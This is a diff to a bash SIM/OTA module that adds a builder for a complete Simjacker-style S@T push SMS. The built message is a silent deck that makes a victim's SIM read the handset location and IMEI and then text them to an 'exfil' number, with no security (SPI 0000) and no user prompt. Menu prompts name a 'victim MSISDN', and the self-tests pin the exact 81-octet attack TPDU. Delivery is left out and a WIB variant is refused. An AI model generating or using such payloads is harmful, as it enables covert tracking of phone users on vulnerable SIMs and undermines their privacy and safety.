@@ -3,8 +3,9 @@
 #
 # An OTA (Over-The-Air) binary SMS is how a carrier updates a SIM: a TS 23.048
 # command packet carrying SPI, TAR, counter and a KIc/KID-selected key set. The
-# protocol is published; the S@T and WIB application classes are documented.
-# What is *not* free is the target: affecting a SIM you do not hold needs that
+# protocol is published, and the S@T push that Simjacker rides is built here
+# from S@T 01.00 / 01.23; WIB is refused rather than guessed, because no
+# public clause states its command encoding. What is *not* free is the target: affecting a SIM you do not hold needs that
 # SIM's OTA keys, so this module is built for own-SIM and lab construction plus
 # the audit that finds a weak SPI, a replayed counter or an un-keyed payload.
 # 16_sim keeps the reader/defensive side; this module builds and audits.
@@ -92,6 +93,8 @@ otasm_status_tsv() {
     printf 'TRANSMIT\tnone — construction and audit; delivery is a handoff\n'
     printf 'TP_LAYER\tMTI/PID/DCS/SCTS/address/UDL encode and parse; Type 0 audit\n'
     printf 'KAT\tTS 23.038 §6.1.2.1.1 packing vectors (hi=e834, hello=e8329bfd06)\n'
+    printf 'PUSH\tS@T push built (--sat-push): 42/deck/card + 2d macros in a TS 31.115 packet, TAR 505348, SMS TP-PID 0x7F\n'
+    printf 'WIB\trefused (--wib-push): no citable WIB command encoding, so no push is invented\n'
     printf 'SELFTEST\tyes\n'
 }
 
@@ -1640,6 +1643,316 @@ otasm_tp_packing_kat() {
     return $(( n > 0 ))
 }
 
+# ── S@T push: SIMalliance S@T 01.00 decks on the S@T 01.23 push ─────────
+# A S@T push is not a 0xD0 envelope. The deck travels as the secured data of a
+# TS 31.115 §4.2 command packet under TAR "PSH" = 0x505348 (S@T 01.23 §7), in an
+# SMS whose TP-PID is 0x7F (TS 23.040 §9.2.3.9) and whose TP-UDH carries IEI
+# 0x70, the marker that a SIM Toolkit security header follows (TS 23.040
+# §9.2.3.24.7). The 0xD0 proactive command appears only when the card's S@T
+# browser executes a 0x2D STK generic macro (S@T 01.00 §6.2.9), which is the
+# *card to terminal* direction. So --sat-push prints the real push and the D0
+# each macro renders to, and cross-checks that rendering octet for octet
+# against modules/52_stk.sh rather than duplicating it silently.
+
+# TL[A]V (S@T 01.00 §4): a one-octet tag whose bit 8 flags an attribute byte, a
+# BER length, then the value. Nothing here needs an attribute byte, so every tag
+# written has bit 8 clear and the length counts the value octets alone.
+otasm_sat_tlv() {
+    local tag val l
+    tag=$(otasm_norm_hex "${1:-}"); val=$(otasm_norm_hex "${2:-}")
+    otasm_is_hex "$tag" && (( ${#tag} == 2 )) || {
+        printf 'ERROR\tS@T tag must be one octet of hex\n' >&2; return 2; }
+    [[ -z "$val" ]] || otasm_is_hex "$val" || {
+        printf 'ERROR\tS@T value must be hex\n' >&2; return 2; }
+    l=$(otasm_berlen "$(( ${#val} / 2 ))") || return 2
+    printf '%s%s%s\n' "${tag,,}" "${l,,}" "${val,,}"
+}
+
+# STK generic macro (S@T 01.00 §6.2.9). The value is the command type and
+# qualifier of TS 102 223 §9.4/§8.6, the destination device of §8.7, then the
+# command's own COMPREHENSION-TLVs. The browser renders the macro as the
+# proactive command "D0 L 01 03 <number> <type> <qualifier> 02 02 81 <dest>".
+otasm_sat_stk_macro() {
+    local type qual dest value f t
+    type=$(otasm_norm_hex "${1:-}"); qual=$(otasm_norm_hex "${2:-}")
+    dest=$(otasm_norm_hex "${3:-82}")
+    local params=("${@:4}")
+    for f in "$type" "$qual" "$dest"; do
+        otasm_is_hex "$f" && (( ${#f} == 2 )) || {
+            printf 'ERROR\tS@T macro needs a one-octet command type, qualifier and destination device\n' >&2
+            return 2; }
+    done
+    value="${type}${qual}${dest}"
+    for t in "${params[@]}"; do
+        [[ -z "$t" ]] && continue
+        t=$(otasm_norm_hex "$t")
+        otasm_is_hex "$t" || {
+            printf 'ERROR\tS@T macro parameter must be hex\n' >&2; return 2; }
+        value+="$t"
+    done
+    otasm_sat_tlv 2D "$value"
+}
+
+# PROVIDE LOCAL INFORMATION has no command-specific data object (TS 102 223
+# §6.6.15), so the qualifier alone picks the datum: 00 location information,
+# 01 IMEI of the terminal (TS 102 223 §8.6).
+otasm_sat_pli_macro() { otasm_sat_stk_macro 26 "${1:-00}" "${2:-82}"; }
+
+# SEND SHORT MESSAGE (TS 102 223 §6.6.9) needs the 3GPP-SMS TPDU data object,
+# tag 0x0B (ETSI TS 131 111 §8.13), and nothing else: with no Address data
+# object the ME inserts its own service centre, so the message leaves the
+# handset without the card knowing or needing to name one.
+otasm_sat_send_sms_macro() {
+    local tpdu tlv
+    tpdu=$(otasm_norm_hex "${1:-}")
+    otasm_is_hex "$tpdu" || {
+        printf 'ERROR\tSEND SHORT MESSAGE needs a hex 3GPP-SMS TPDU\n' >&2; return 2; }
+    tlv=$(otasm_sat_tlv 0B "$tpdu") || return 2
+    otasm_sat_stk_macro 13 00 "${2:-82}" "$tlv"
+}
+
+# Card (S@T 01.00 §5.3.6): card id element, then the byte code elements. No
+# attribute byte, so the card runs once in the order the deck lists it.
+otasm_sat_card() {
+    local id value bc
+    id=$(otasm_norm_hex "${1:-01}")
+    value=$(otasm_sat_tlv 06 "$id") || return 2
+    local bcs=("${@:2}")
+    for bc in "${bcs[@]}"; do
+        [[ -z "$bc" ]] && continue
+        bc=$(otasm_norm_hex "$bc")
+        otasm_is_hex "$bc" || {
+            printf 'ERROR\tS@T byte code must be hex\n' >&2; return 2; }
+        value+="$bc"
+    done
+    otasm_sat_tlv 05 "$value"
+}
+
+# Deck (S@T 01.00 §5.3.2): deck id element, then its cards. No SPS, no variable
+# reference list, no text table and no card template, so this is a static deck.
+otasm_sat_deck() {
+    local id value c
+    id=$(otasm_norm_hex "${1:-01}")
+    value=$(otasm_sat_tlv 02 "$id") || return 2
+    local cards=("${@:2}")
+    for c in "${cards[@]}"; do
+        [[ -z "$c" ]] && continue
+        c=$(otasm_norm_hex "$c")
+        otasm_is_hex "$c" || {
+            printf 'ERROR\tS@T card must be hex\n' >&2; return 2; }
+        value+="$c"
+    done
+    otasm_sat_tlv 01 "$value"
+}
+
+# Generic push command (S@T 01.23 §6.1): the push tag around the deck. No push
+# name element, so the browser puts no prompt in front of the user -- which is
+# the whole point of the low priority push of §7.
+otasm_sat_push_cmd() { otasm_sat_tlv 42 "$(otasm_norm_hex "${1:-}")"; }
+
+# The canonical deck Simjacker's public description spells out: the card reads
+# its own location and IMEI into variables and then sends an SMS by itself. The
+# exfiltrating message is a complete SMS-SUBMIT built here too, so the octets
+# that leave the card can be audited rather than taken on trust.
+otasm_sat_deck_build() {
+    local exfil="${1:-15559876543}" text="${2:-S@T-PUSH}"
+    local da nsept inner m1 m2 m3 card deck push
+    da=$(otasm_tp_addr_build 1 1 "$exfil") || return 2
+    nsept=$(otasm_tp_septets "$text" | wc -w | tr -d ' ') || return 2
+    inner=$(otasm_tpdu_build_submit "$da" 00 00 "$(otasm_tp_pack_text "$text")" \
+        "$nsept" 0 0 "" 0) || return 2
+    m1=$(otasm_sat_pli_macro 00 82) || return 2
+    m2=$(otasm_sat_pli_macro 01 82) || return 2
+    m3=$(otasm_sat_send_sms_macro "$inner" 82) || return 2
+    card=$(otasm_sat_card 01 "$m1" "$m2" "$m3") || return 2
+    deck=$(otasm_sat_deck 01 "$card") || return 2
+    push=$(otasm_sat_push_cmd "$deck") || return 2
+    printf 'inner_tpdu\t%s\n' "$inner"
+    printf 'bytecode_location\t%s\nbytecode_imei\t%s\nbytecode_sms\t%s\n' "$m1" "$m2" "$m3"
+    printf 'card_hex\t%s\ndeck_hex\t%s\npush_hex\t%s\n' "$card" "$deck" "$push"
+    return 0
+}
+
+# The rendering S@T 01.00 §6.2.9 specifies: command details (number, type,
+# qualifier), device identities (UICC to the macro's destination), then the
+# macro's own TLVs, all inside a D0 envelope whose BER length counts the body.
+otasm_sat_render_d0() {
+    local num type qual dst body tlv
+    num=$(otasm_norm_hex "${1:-01}"); type=$(otasm_norm_hex "${2:-}")
+    qual=$(otasm_norm_hex "${3:-}"); dst=$(otasm_norm_hex "${4:-82}")
+    [[ ${#num} -eq 2 && ${#type} -eq 2 && ${#qual} -eq 2 && ${#dst} -eq 2 ]] || {
+        printf 'ERROR\trendered command needs one-octet number, type, qualifier and destination\n' >&2
+        return 2; }
+    body=$(otasm_sat_tlv 01 "${num}${type}${qual}") || return 2
+    body+=$(otasm_sat_tlv 02 "81${dst}") || return 2
+    local params=("${@:5}")
+    for tlv in "${params[@]}"; do
+        [[ -z "$tlv" ]] || body+=$(otasm_norm_hex "$tlv")
+    done
+    otasm_sat_tlv D0 "$body"
+}
+
+# modules/52_stk.sh builds the same D0 COMPREHENSION-TLVs from the same clauses.
+# Driving it from the CLI and comparing octets keeps this rendering honest: an
+# independent builder that agrees is evidence, a duplicate that disagrees
+# silently is the defect.
+otasm_sat_stk52() {
+    local type="${1:-}" qual="${2:-}" src="${3:-81}" dst="${4:-82}" num="${5:-01}"
+    local m="$IMSISTING_ROOT/modules/52_stk.sh"
+    [[ -f "$m" ]] || {
+        printf 'ERROR\tmodules/52_stk.sh is not present; the rendered command cannot be cross-checked\n' >&2
+        return 1; }
+    bash "$m" --build "$type" "$qual" "$src" "$dst" "$num" 2>/dev/null | tail -n 1 | tr -d '[:space:]'
+}
+
+# 52_stk writes only the command details and device identities, so a macro that
+# carries further TLVs (SEND SHORT MESSAGE) is compared on the part both build.
+otasm_sat_cmp52() {
+    local mine ref ro mo refbody mybody
+    mine=$(otasm_norm_hex "${1:-}"); ref=$(otasm_norm_hex "${2:-}")
+    [[ -n "$mine" && -n "$ref" ]] || { printf 'mismatch\n'; return 0; }
+    ro=$(otasm_berlen_read "$ref" 1 | cut -f2)
+    mo=$(otasm_berlen_read "$mine" 1 | cut -f2)
+    [[ -n "$ro" && -n "$mo" ]] || { printf 'mismatch\n'; return 0; }
+    refbody=${ref:$(( (1 + ro) * 2 ))}
+    mybody=${mine:$(( (1 + mo) * 2 ))}
+    [[ "$mybody" == "$refbody"* ]] && printf 'match\n' || printf 'mismatch\n'
+}
+
+otasm_sat_cc52() {
+    local d0="${1:-}" ref
+    ref=$(otasm_sat_stk52 "${2:-}" "${3:-}" 81 82 01 2>/dev/null) || ref=""
+    if [[ -z "$ref" ]]; then printf 'skip\n'; return 0; fi
+    otasm_sat_cmp52 "$d0" "$ref"
+}
+
+# --sat-push [<victim-msisdn>] [<exfil-msisdn>] [<spi>]
+# The SPI defaults to 0000, the no-security value the public SIMjacker samples
+# carry. S@T 01.23 §7 recommends a non-zero SPI and names 12 (CC, counter mode
+# 2) as the interoperable one, which this verb builds as 1200 when asked and
+# then needs OTASM_KID_KEY for the CC.
+otasm_sat_push_build() {
+    local victim="${1:-15551234567}" exfil="${2:-15559876543}" spi
+    spi=$(otasm_norm_hex "${3:-0000}")
+    otasm_is_hex "$spi" && (( ${#spi} == 4 )) || {
+        printf 'ERROR\tSPI must be two octets of hex (0000 no security, 1200 CC)\n' >&2
+        return 2; }
+    local da pts pt deckts push inner ud udl tpdu
+    da=$(otasm_tp_addr_build 1 1 "$victim") || return 2
+    deckts=$(otasm_sat_deck_build "$exfil") || return 2
+    push=$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="push_hex"{print $2; exit}')
+    [[ -n "$push" ]] || { printf 'ERROR\tthe S@T deck did not build\n' >&2; return 2; }
+
+    # The card-routed transport: TAR "PSH" (S@T 01.23 §7) in the TS 31.115 §4.2
+    # packet, and the packet in the TP-UD behind the IEI 0x70 marker.
+    pts=$(otasm_packet_sms_build 505348 0 "$spi" 00 00 "$push") || return 2
+    pt=$(printf '%s\n' "$pts" | awk -F'\t' '$1=="packet"{print $2; exit}')
+    [[ -n "$pt" ]] || {
+        printf 'ERROR\tthe TS 31.115 command packet did not build\n' >&2; return 2; }
+    pt=${pt,,}
+    ud="027000${pt}"
+    udl=$(( ${#ud} / 2 ))
+    tpdu=$(otasm_tpdu_build_submit "$da" 7f f6 "$ud" "$udl" 0 0 "" 0x40) || return 2
+    tpdu=${tpdu,,}
+
+    inner=$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="inner_tpdu"{print $2; exit}')
+    local d0loc d0imei d0sms dpt
+    d0loc=$(otasm_sat_render_d0 01 26 00 82) || return 2
+    d0imei=$(otasm_sat_render_d0 01 26 01 82) || return 2
+    d0sms=$(otasm_sat_render_d0 01 13 00 82 "$(otasm_sat_tlv 0B "$inner")") || return 2
+    local cc_loc cc_imei cc_sms
+    cc_loc=$(otasm_sat_cc52 "$d0loc" 26 00)
+    cc_imei=$(otasm_sat_cc52 "$d0imei" 26 01)
+    cc_sms=$(otasm_sat_cc52 "$d0sms" 13 00)
+
+    printf 'pdu_type\tsat-push\n'
+    printf 'envelope\t%s\n' \
+        'TS 31.115 §4.2 SMS command packet, TAR 505348 ("PSH", S@T 01.23 §7); secured data = S@T push 42 over deck 01 over card 05, carried in an SMS-SUBMIT whose TP-UDH is IEI 70 (TS 23.040 §9.2.3.24.7)'
+    printf 'commands\t%s\n' \
+        '3 STK generic macros (0x2D): 26/00 PROVIDE LOCAL INFORMATION location, 26/01 PROVIDE LOCAL INFORMATION IMEI, 13/00 SEND SHORT MESSAGE carrying a 0B 3GPP-SMS TPDU'
+    printf 'bytes\t%d\n' "$(( ${#tpdu} / 2 ))"
+    printf 'hex\t%s\n' "$tpdu"
+    printf 'sent\t0\n'
+    printf 'tp_layer\tsms-submit TPDU (TS 23.040 §9.2.2.2) with TP-UDHI set; TP-UD = UDH 02 70 00 then the packet\n'
+    printf 'tp_fo\t%s\n' "${tpdu:0:2}"
+    printf 'tp_da\t%s\n' "$da"
+    printf 'tp_pid\t7f\n'
+    printf 'tp_dcs\tf6\n'
+    printf 'tp_udl\t%s\n' "$(printf '%02x' "$udl")"
+    printf 'udh_hex\t027000\n'
+    printf 'ud_hex\t%s\n' "$ud"
+    printf 'tpdu_with_sca\t%s\n' "00${tpdu}"
+    printf 'ota_packet_hex\t%s\n' "$pt"
+    printf 'spi\t%s\n' "$spi"
+    printf 'push_hex\t%s\n' "$push"
+    printf 'deck_hex\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="deck_hex"{print $2; exit}')"
+    printf 'card_hex\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="card_hex"{print $2; exit}')"
+    printf 'bytecode_location\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="bytecode_location"{print $2; exit}')"
+    printf 'bytecode_imei\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="bytecode_imei"{print $2; exit}')"
+    printf 'bytecode_sms\t%s\n' "$(printf '%s\n' "$deckts" | awk -F'\t' '$1=="bytecode_sms"{print $2; exit}')"
+    printf 'inner_tpdu_hex\t%s\n' "$inner"
+    printf 'rendered_d0_location\t%s\n' "$d0loc"
+    printf 'rendered_d0_imei\t%s\n' "$d0imei"
+    printf 'rendered_d0_sms\t%s\n' "$d0sms"
+    printf 'crosscheck_location\t%s\n' "$cc_loc"
+    printf 'crosscheck_imei\t%s\n' "$cc_imei"
+    printf 'crosscheck_sms\t%s\n' "$cc_sms"
+
+    # Each S@T element named with its length, so the hex is readable as a
+    # structure rather than as a blob.
+    printf 'tlv\t%s\n' "42 push command (S@T 01.23 §6.1), $(( ${#push} / 2 )) octets, no push name so no user prompt"
+    printf 'tlv\t%s\n' "01 deck (S@T 01.00 §5.3.2)"
+    printf 'tlv\t%s\n' "02 deck id = 01"
+    printf 'tlv\t%s\n' "05 card (S@T 01.00 §5.3.6)"
+    printf 'tlv\t%s\n' "06 card id = 01"
+    printf 'tlv\t%s\n' "2d STK generic macro: 26/00 PROVIDE LOCAL INFORMATION location (S@T 01.00 §6.2.9 + TS 102 223 §9.4/§8.6)"
+    printf 'tlv\t%s\n' "2d STK generic macro: 26/01 PROVIDE LOCAL INFORMATION IMEI"
+    printf 'tlv\t%s\n' "2d STK generic macro: 13/00 SEND SHORT MESSAGE with 0b 3GPP-SMS TPDU (TS 102 223 §6.6.9, TS 131 111 §8.13)"
+
+    printf 'ref\t%s\n' 'S@T 01.23 §6.1 — generic push command: push tag, optional push name, deck'
+    printf 'ref\t%s\n' 'S@T 01.23 §7 — low priority push uses TAR "PSH" 0x505348 and recommends a non-zero SPI (0x12)'
+    printf 'ref\t%s\n' 'S@T 01.00 §4 — TL[A]V: tag, BER length, value; bit 8 of the tag flags an attribute byte'
+    printf 'ref\t%s\n' 'S@T 01.00 §5.3.2 — deck: deck id, optional SPS/varref list/text table/card template, cards'
+    printf 'ref\t%s\n' 'S@T 01.00 §5.3.6 — card: card id then byte code elements'
+    printf 'ref\t%s\n' 'S@T 01.00 §6.2.9 — STK generic macro: type, qualifier, destination device, TLVs, rendered as D0 with 01 03 <no> <type> <qual> and 02 02 81 <dest>'
+    printf 'ref\t%s\n' 'TS 102 223 §9.4 — type of command 26 PROVIDE LOCAL INFORMATION, 13 SEND SHORT MESSAGE'
+    printf 'ref\t%s\n' 'TS 102 223 §8.6 — PLI qualifier 00 location, 01 IMEI; §8.7 device identities 81 UICC, 82 terminal'
+    printf 'ref\t%s\n' 'TS 102 223 §6.6.9 — SEND SHORT MESSAGE needs the 3GPP-SMS TPDU; with no Address data object the ME inserts its own service centre'
+    printf 'ref\t%s\n' 'ETSI TS 131 111 §8.13 — 3GPP-SMS TPDU data object tag 0B, TPDU formatted per TS 23.040'
+    printf 'ref\t%s\n' 'TS 23.040 §9.2.3.24.7 — UDH IEI 70 says a SIM Toolkit security header follows the TP-UDH'
+    printf 'ref\t%s\n' 'TS 23.040 §9.2.3.9 — TP-PID 0x7F = (U)SIM data download'
+    printf 'ref\t%s\n' 'TS 23.040 §9.2.3.9 — (U)SIM Data download sets TP-PID 0x7F and message class 2, and names 8 bit message class 2 with bit coding 11110110 = 0xF6'
+    printf 'ref\t%s\n' 'TS 23.040 §9.1.2.5 — TP-DA is a length octet, a type-of-address octet and semi-octet digits'
+    printf 'ref\t%s\n' 'TS 31.115 §4.2 / TS 102 225 §5.1.1 — CPL, CHL, SPI, KIc, KID, TAR, CNTR, PCNTR, secured data'
+
+    printf 'limit\t%s\n' 'the card S@T browser is not modelled: what the deck does needs EF_SST service 26 (SMS-PP download) and 29 (proactive UICC) enabled and a S@T applet present'
+    printf 'limit\t%s\n' 'no delivery: an SMSC or OTA gateway is needed, so sent is 0 by construction'
+    printf 'limit\t%s\n' 'the deck requests location and IMEI into card variables and sends a fixed body; binding the returned terminal response into the outbound SMS needs S@T CONCATENATE and varref encoding, which this verb does not build'
+    printf 'limit\t%s\n' 'SPI 0000 is the no-security form the public SIMjacker samples use; the S@T-recommended 1200 form is built on request and needs OTASM_KID_KEY'
+    printf 'limit\t%s\n' 'no CAT_TP / 23.048 address-addressed carrier: this is the SMS TP-UD form only'
+    printf 'note\t%s\n' 'no 0xD0 octet is on the wire: the rendered_d0_* rows are the commands the card emits toward the terminal when the browser runs each macro (S@T 01.00 §6.2.9), not the transport envelope'
+    if [[ "$cc_loc" == mismatch || "$cc_imei" == mismatch || "$cc_sms" == mismatch ]]; then
+        printf 'ERROR\tthe rendered D0 disagrees with modules/52_stk.sh; the push built but its rendering is not trustworthy\n' >&2
+        return 1
+    fi
+    return 0
+}
+
+# --wib-push: refused rather than invented. A plausible-looking WIB bytecode
+# would read as a built push while carrying nothing that a card would execute,
+# so the refusal names the missing clause instead (MODULE_CONVENTIONS §9).
+otasm_wib_push() {
+    cat >&2 <<'EOF'
+ERROR	WIB push not built: no clause this module can cite states the WIB application request encoding
+WHY	TS 102 223 §8 and the S@T command set name the S@T browser; neither defines a WIB command, and this repository carries no WIB specification
+WHY	the public WIB material (#WIBattack, CVE-2020-13888) states the impact and the applet, not the byte layout of a WIB command or the leaf tags of a WIB application request
+WHY	an invented encoding would still render as a push PDU and could not be told apart from a real one, which is the failure MODULE_CONVENTIONS §9 rules out
+NOTE	the transport half is shared and built: --sat-push already emits the TS 31.115 §4.2 packet, its SPI/KIc/KID/TAR header, TP-PID 0x7F, TP-DCS 0xF6 and the UDH IEI 70 carrier a WIB push would ride
+NOTE	to unblock: the SIMalliance WIB specification's card command chapter, or one captured WIB push message
+EOF
+    return 2
+}
+
 otasm_plan() {
     cat <<'EOF'
 status	handoff
@@ -1952,7 +2265,107 @@ otasm_selftest() {
     chk tp-mti-reserved "$(printf '%s\n' "$(otasm_tpdu_parse "03${t0:2}")" | awk -F'\t' '$1=="finding" && $2=="MEDIUM"' | wc -l | tr -d ' ')" "1"
     chk tp-udhi "$(fld "$(otasm_tpdu_parse "$(otasm_tpdu_build_deliver "$af" 00 00 "$scts" deadbeef 4 64)")" mt_udhi)" "1"
 
-    # 6. Scope: no send/deliver verb is dispatchable.
+    # 6. S@T push. Every octet below is composed from the clause named beside
+    #    it rather than read back out of the builder, so a structural drift
+    #    fails the assertion instead of being blessed as the new answer.
+    local sp; sp=$(otasm_sat_push_build 15551234567 15559876543 0000)
+    # S@T 01.00 §6.2.9: 2d, length 03, then type / qualifier / destination.
+    # TS 102 223 §9.4 type 26 = PROVIDE LOCAL INFORMATION, §8.6 qualifier 00 =
+    # location and 01 = IMEI, §8.7 destination 82 = terminal.
+    chk sat-macro-location "$(fld "$sp" bytecode_location)" "2d03260082"
+    chk sat-macro-imei     "$(fld "$sp" bytecode_imei)" "2d03260182"
+    # The SEND SHORT MESSAGE macro is 2d, length 19 = 3 + the 0b TLV's 22
+    # (tag + length + the 20-octet 3GPP-SMS TPDU of TS 131 111 §8.13).
+    chk sat-macro-sms-head "$(printf '%s' "$(fld "$sp" bytecode_sms)" | cut -c1-8)" "2d191300"
+    chk sat-exfil-da       "$(fld "$(otasm_tpdu_parse "$(fld "$sp" inner_tpdu_hex)")" da_value)" "15559876543"
+    chk sat-exfil-udl      "$(fld "$(otasm_tpdu_parse "$(fld "$sp" inner_tpdu_hex)")" udl)" "8"
+    # "S@T-PUSH" packed per TS 23.038 §6.1.2.1.1 (the packer itself is anchored
+    # on the hi/hello vectors in section 3).
+    chk sat-exfil-ud       "$(fld "$(otasm_tpdu_parse "$(fld "$sp" inner_tpdu_hex)")" ud)" "5300b505ad4e91"
+    # Card 05, length 28 = 40 octets = 3 (06 01 01) + 5 + 5 + 27; deck 01,
+    # length 2d = 45 = 3 (02 01 01) + 42; push 42, length 2f = 47 = 2 + 45.
+    chk sat-card-head "$(printf '%s' "$(fld "$sp" card_hex)" | cut -c1-10)" "0528060101"
+    chk sat-deck-head "$(printf '%s' "$(fld "$sp" deck_hex)" | cut -c1-10)" "012d020101"
+    chk sat-push-head "$(printf '%s' "$(fld "$sp" push_hex)" | cut -c1-4)" "422f"
+    # TS 31.115 §4.2 header: CPL 003f (63 = 14 + 49), CHL 0d (13 = SPI 2 + KIc 1
+    # + KID 1 + TAR 3 + CNTR 5 + PCNTR 1), SPI 0000, KIc 00, KID 00, TAR 505348
+    # (S@T 01.23 §7 "PSH"), CNTR 0000000000, PCNTR 00.
+    chk sat-packet-head "$(printf '%s' "$(fld "$sp" ota_packet_hex)" | cut -c1-32)" "003f0d00000000505348000000000000"
+    # TS 23.040 §9.2.3.24.7: UDHL 2, IEI 70, length 0 -- "a Security Header is
+    # always present at the start of the TP-User-Data".
+    chk sat-udh "$(fld "$sp" udh_hex)" "027000"
+    chk sat-udl "$(fld "$sp" tp_udl)" "44"
+    # The whole SMS-SUBMIT, 81 octets, composed from the clauses above.
+    chk sat-tpdu "$(fld "$sp" hex)" "41000b915155214365f77ff644027000003f0d00000000505348000000000000422f012d02010105280601012d032600822d032601822d191300820b1401000b915155896745f30000085300b505ad4e91"
+    local out2; out2=$(otasm_tpdu_parse "$(fld "$sp" hex)")
+    chk sat-octets "$(fld "$out2" tpdu_octets)" "81"
+    chk sat-pid    "$(fld "$out2" pid)" "7f"
+    chk sat-dcs    "$(fld "$out2" dcs)" "f6"
+    chk sat-udhi   "$(fld "$out2" mt_udhi)" "1"
+    chk sat-ud     "$(fld "$out2" ud)" "027000$(fld "$sp" ota_packet_hex)"
+    chk sat-sent   "$(fld "$sp" sent)" "0"
+    # The 0xD0 rendering S@T 01.00 §6.2.9 specifies, and the byte comparison
+    # against 52_stk, which builds those TLVs from the same clauses.
+    chk sat-d0-location "$(fld "$sp" rendered_d0_location)" "d009010301260002028182"
+    chk sat-d0-imei     "$(fld "$sp" rendered_d0_imei)" "d009010301260102028182"
+    chk sat-d0-sms-head "$(printf '%s' "$(fld "$sp" rendered_d0_sms)" | cut -c1-20)" "d01f0103011300020281"
+    chk sat-crosscheck-location "$(fld "$sp" crosscheck_location)" "match"
+    chk sat-crosscheck-imei     "$(fld "$sp" crosscheck_imei)" "match"
+    chk sat-crosscheck-sms      "$(fld "$sp" crosscheck_sms)" "match"
+    chk sat-52stk-direct "$(otasm_sat_stk52 26 00 81 82 01 | tr 'A-F' 'a-f')" "d009010301260002028182"
+    # The comparison must be able to fail: one octet changed is a mismatch.
+    chk sat-crosscheck-negative "$(otasm_sat_cmp52 d009010301260002028183 d009010301260002028182)" "mismatch"
+    # S@T 01.23 §7 recommends a non-zero SPI and names 0x12, which this module
+    # writes as 1200 (RC/CC/DS = CC, counter mode 2). The CC then needs the KID
+    # key, and the parse verifies it.
+    local spcc; spcc=$(OTASM_KID_KEY=0102030405060708090A0B0C0D0E0F10 \
+        otasm_sat_push_build 15551234567 15559876543 1200)
+    chk sat-cc-spi "$(fld "$spcc" spi)" "1200"
+    chk sat-cc-chl "$(printf '%s' "$(fld "$spcc" ota_packet_hex)" | cut -c5-6)" "15"
+    chk sat-cc-octets "$(( $(fld "$spcc" bytes) - $(fld "$sp" bytes) ))" "8"
+    local ccback; ccback=$(OTASM_KID_KEY=0102030405060708090A0B0C0D0E0F10 \
+        otasm_packet_sms_parse "$(fld "$spcc" ota_packet_hex)")
+    chk sat-cc-verdict "$(fld "$ccback" cc_verdict)" "verified"
+    chk sat-cc-apdu    "$(fld "$ccback" apdu | tr 'A-F' 'a-f')" "$(fld "$sp" push_hex)"
+    # WIB is refused with the reason on stderr, never invented.
+    chk sat-wib-rc  "$(otasm_cli_main --wib-push >/dev/null 2>&1; echo $?)" "2"
+    chk sat-wib-why "$(otasm_cli_main --wib-push 2>&1 >/dev/null | awk -F'\t' '$1=="WHY"' | wc -l | tr -d ' ')" "3"
+    chk sat-wib-stdout-empty "$(otasm_cli_main --wib-push 2>/dev/null | wc -c | tr -d ' ')" "0"
+    # The TP layer is also decoded by a third-party TS 23.040 implementation
+    # when one is importable. pycrate is not vendored here, so its absence is a
+    # SKIP row and never a PASS.
+    local opy="${SAT_ORACLE_PY:-python3}" orc=""
+    if command -v "$opy" >/dev/null 2>&1; then
+        orc=$("$opy" - "$(fld "$sp" hex)" 2>/dev/null <<'PY'
+import sys, re
+from pycrate_mobile.TS23040_SMS import SMS_SUBMIT
+s = SMS_SUBMIT()
+s.from_bytes(bytes.fromhex(sys.argv[1]))
+r = s.repr()
+def g(p):
+    m = re.search(p, r)
+    return m.group(1) if m else ''
+print('octets\t%d' % s.get_len())
+print('protocol\t' + g(r'Protocol : (\d+) \(\(U\)SIM Data download\)'))
+print('charset\t' + g(r'Charset : (\d+) \(8 bit data\)'))
+print('class\t' + g(r'Class : (\d+) \(Class 2'))
+print('udl\t' + g(r'UDL : (\d+)'))
+print('iei\t' + g(r'T : (\d+) \(\(U\)SIM Toolkit Security Headers\)'))
+PY
+)
+    fi
+    if [[ -n "$orc" ]]; then
+        chk sat-oracle-octets   "$(fld "$orc" octets)"   "81"
+        chk sat-oracle-protocol "$(fld "$orc" protocol)" "63"
+        chk sat-oracle-charset  "$(fld "$orc" charset)"  "1"
+        chk sat-oracle-class    "$(fld "$orc" class)"    "2"
+        chk sat-oracle-udl      "$(fld "$orc" udl)"      "68"
+        chk sat-oracle-udh-iei  "$(fld "$orc" iei)"      "112"
+    else
+        printf 'sat-oracle-decode\tSKIP\tno pycrate_mobile decoder for %s; the TP layer is asserted against this module and the S@T layers against 52_stk\n' "$opy"
+    fi
+
+    # 7. Scope: no send/deliver verb is dispatchable.
     chk scope-no-send    "$(otasm_cli_main --send >/dev/null 2>&1; echo $?)" "2"
     chk scope-no-deliver "$(otasm_cli_main --deliver >/dev/null 2>&1; echo $?)" "2"
 
@@ -1986,6 +2399,9 @@ otasm_menu() {
   --- TS 31.115 secured command packet ---
   [16] Build a ciphered command packet with its CC
   [17] Parse it back and check the CC
+  --- S@T push / WIB ---
+  [18] Build an S@T push (deck of 0x2d macros in TAR 505348, SMS TP-PID 0x7F)
+  [19] WIB push (refused: no citable command encoding)
   [0]  back
 M
         read -rp "  choice> " c || return 0
@@ -2012,6 +2428,12 @@ M
                 read -rsp "  KID key hex (hidden, empty for none)> " kd; echo
                 OTASM_KIC_KEY="$kk" OTASM_KID_KEY="$kd" otasm_packet_sms_parse "$p"
                 read -rp "  enter " _ ;;
+            18) read -rp "  victim MSISDN (blank = 15551234567)> " vv
+                read -rp "  exfil MSISDN (blank = 15559876543)> " ee
+                read -rp "  SPI (blank = 0000 no security)> " ss
+                otasm_sat_push_build "${vv:-}" "${ee:-}" "${ss:-}"
+                read -rp "  enter " _ ;;
+            19) otasm_wib_push; read -rp "  enter " _ ;;
             7) read -rp "  TP-PID hex> " p; otasm_tp_pid_parse "$p"; read -rp "  enter " _ ;;
             8) read -rp "  [p]arse or [b]uild> " m
                if [[ "$m" == b ]]; then
@@ -2105,6 +2527,8 @@ otasm_cli_main() {
         --smsc-wrap)      otasm_smsc_wrap "${1:-}" "${2:-}" ;;
         --type0-build)    otasm_type0_build "${1:-}" "${2:-}" "${3:-00}" ;;
         --type0)          otasm_type0_audit "${1:-}" ;;
+        --sat-push)       otasm_sat_push_build "${1:-}" "${2:-}" "${3:-}" ;;
+        --wib-push)       otasm_wib_push ;;
         --plan)           otasm_plan ;;
         --plan-tp)        otasm_plan_tp ;;
